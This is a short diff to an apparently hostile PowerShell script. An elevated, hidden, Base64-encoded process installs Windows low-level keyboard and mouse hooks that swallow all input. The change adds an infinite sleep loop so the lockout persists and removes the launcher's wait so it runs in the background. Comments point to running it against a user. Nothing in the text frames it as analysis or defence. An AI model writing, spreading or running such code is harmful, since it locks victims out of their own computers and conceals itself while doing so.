@@ -10,9 +10,12 @@ $scriptBlock10={
             $scriptBlocklove={
             Add-Type -TypeDefinition "using System;using System.Runtime.InteropServices;public class H{static IntPtr h,m;static L k,l;delegate IntPtr L(int n,IntPtr w,IntPtr p);public static void S(){k=K;l=K;h=SetWindowsHookEx(14,k,IntPtr.Zero,0);m=SetWindowsHookEx(13,l,IntPtr.Zero,0);}public static void U(){UnhookWindowsHookEx(h);UnhookWindowsHookEx(m);}static IntPtr K(int n,IntPtr w,IntPtr p){return (IntPtr)1;}[DllImport(`"user32.dll`")]static extern IntPtr SetWindowsHookEx(int i,L d,IntPtr m,uint t);[DllImport(`"user32.dll`")]static extern bool UnhookWindowsHookEx(IntPtr h);}";
             [H]::S();
+            while(1){
+            start-sleep -Seconds 99
+            }
             }
             $encodedCommandlove = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($scriptBlocklove.ToString()))
-            Start-Process powershell.exe -ArgumentList "-EncodedCommand $encodedCommandlove" -Verb RunAs -Wait -WindowStyle Hidden
+            Start-Process powershell.exe -ArgumentList "-EncodedCommand $encodedCommandlove" -Verb RunAs -WindowStyle Hidden
 
             #execute to user
             #execute stuff for the background
